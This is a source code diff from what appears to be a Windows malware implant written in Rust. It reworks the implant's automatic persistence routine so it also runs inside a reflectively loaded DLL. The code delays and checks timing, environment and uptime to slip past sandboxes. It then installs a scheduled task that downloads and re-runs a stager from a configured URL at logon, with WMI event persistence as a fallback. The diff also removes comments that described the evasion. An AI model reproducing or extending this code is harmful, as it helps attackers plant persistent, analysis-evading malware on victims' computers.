@@ -1458,16 +1458,24 @@ pub fn schedule_auto_persistence() {
         return;
     }
 
-    // Spawn background thread for auto-persistence
+    // NOTE: When running as a reflectively-loaded DLL (the normal agent path),
+    // std::thread::spawn() crashes because DLL_THREAD_ATTACH is never sent to
+    // reflectively-loaded DLLs, so MSVC CRT TLS is uninitialised in new threads.
+    // In that case lib.rs::dll_entry spawns the thread via raw CreateThread with
+    // manual TLS init and calls do_auto_persistence_work() directly.
+    // Here (EXE / main.rs path) std::thread::spawn is safe.
     thread::spawn(|| {
+        do_auto_persistence_work();
+    });
+}
+
+/// Inner persistence work — called either from the EXE thread::spawn above,
+/// or directly from the TLS-initialised persist_thread in lib.rs (DLL path).
+#[cfg(target_os = "windows")]
+pub fn do_auto_persistence_work() {
         // ====================================================================
         // TIMING EVASION: Random delay 3-5 minutes with jitter
         // ====================================================================
-        // This evades sandboxes that:
-        // 1. Only analyze for short periods (< 3 min)
-        // 2. Accelerate time (we use real-time checks)
-        // 3. Look for immediate persistence behavior
-
         let jitter_secs = get_machine_index() % AUTO_PERSIST_JITTER_MAX;
         let total_delay = AUTO_PERSIST_BASE_DELAY_SECS + jitter_secs as u64;
 
@@ -1478,13 +1486,10 @@ pub fn schedule_auto_persistence() {
             jitter_secs
         );
 
-        // Sleep in chunks to avoid detection of long sleep calls
-        // Some sandboxes hook Sleep() and fast-forward
         let chunks = total_delay / AUTO_PERSIST_CHUNK_SECS;
         let remainder = total_delay % AUTO_PERSIST_CHUNK_SECS;
 
         for chunk_num in 0..chunks {
-            // Use real-time validation between chunks
             let start = std::time::Instant::now();
             std::thread::sleep(std::time::Duration::from_secs(AUTO_PERSIST_CHUNK_SECS));
 
@@ -1496,37 +1501,29 @@ pub fn schedule_auto_persistence() {
                 elapsed
             );
 
-            // Anti-time-acceleration check: if sleep completed too fast,
-            // sandbox might be accelerating time - abort
             if elapsed < AUTO_PERSIST_TIME_ACCEL_THRESHOLD {
                 debug_print!(
                     "DEBUG: [AUTO-PERSIST] ❌ Time acceleration detected ({}s < {}s threshold), aborting",
                     elapsed,
                     AUTO_PERSIST_TIME_ACCEL_THRESHOLD
                 );
-                return; // Time acceleration detected, abort persistence
+                return;
             }
         }
 
         if remainder > 0 {
-            debug_print!("DEBUG: [AUTO-PERSIST] Sleeping remainder {}s", remainder);
             std::thread::sleep(std::time::Duration::from_secs(remainder));
         }
 
         debug_print!("DEBUG: [AUTO-PERSIST] Delay complete, running environment checks...");
 
-        // ====================================================================
-        // ENVIRONMENT KEYING: Additional sandbox checks before persistence
-        // ====================================================================
         if !environment_check() {
             debug_print!("DEBUG: [AUTO-PERSIST] ❌ Environment check failed, aborting");
-            return; // Sandbox detected, abort silently
+            return;
         }
 
         debug_print!("DEBUG: [AUTO-PERSIST] ✅ Environment check passed");
 
-        // Additional check: system uptime should be at least 3 minutes
-        // By this point we've already waited 3-5 minutes, so this is a sanity check
         let uptime_ms = unsafe { winapi::um::sysinfoapi::GetTickCount64() };
         if uptime_ms < MIN_UPTIME_MS {
             debug_print!(
@@ -1534,7 +1531,7 @@ pub fn schedule_auto_persistence() {
                 uptime_ms,
                 MIN_UPTIME_MS
             );
-            return; // Freshly booted system, likely sandbox
+            return;
         }
 
         debug_print!(
@@ -1542,31 +1539,10 @@ pub fn schedule_auto_persistence() {
             uptime_ms
         );
 
-        // ====================================================================
-        // ULTRA-STEALTH AUTO-PERSISTENCE
-        // ====================================================================
-        // This uses the most undetectable persistence method available.
-        // Priority order (from most to least stealthy):
-        // 1. COM Hijacking - Very stealthy, no PowerShell, no obvious registry keys
-        // 2. Registry Run with explorer.exe - Common pattern, blends in
-        //
-        // Key evasion features:
-        // - Timestomping makes binary appear 6-12 months old
-        // - File hidden in deep Windows folders that mimic system files
-        // - Uses indirect syscalls where possible
-        // - No PowerShell or scripting engines used
-        // - Random jitter in all operations
-
         debug_print!("DEBUG: [AUTO-PERSIST] Establishing ultra-stealth persistence...");
 
-        // Mark as done first to prevent race conditions
         AUTO_PERSIST_DONE.store(true, Ordering::SeqCst);
 
-        // ================================================================
-        // FILELESS PERSISTENCE: Scheduled Task downloads & re-executes
-        // ================================================================
-        // PRIMARY: schtask downloads ester.exe to %TEMP%\<guid>.exe on logon
-        // – no agent binary is written to a permanent disk location.
         match crate::persistence_fileless::persist_scheduled_task_download(
             crate::config::STAGER_URL,
         ) {
@@ -1585,7 +1561,6 @@ pub fn schedule_auto_persistence() {
             }
         }
 
-        // FALLBACK: UserInitMprLogonScript (file-on-disk but stealthy registry location)
         match establish_persistence(PersistenceMethod::WmiEvent) {
             Ok(msg) => {
                 debug_print!(
@@ -1600,7 +1575,6 @@ pub fn schedule_auto_persistence() {
                 );
             }
         }
-    });
 }
 
 /// Dummy implementation for non-Windows
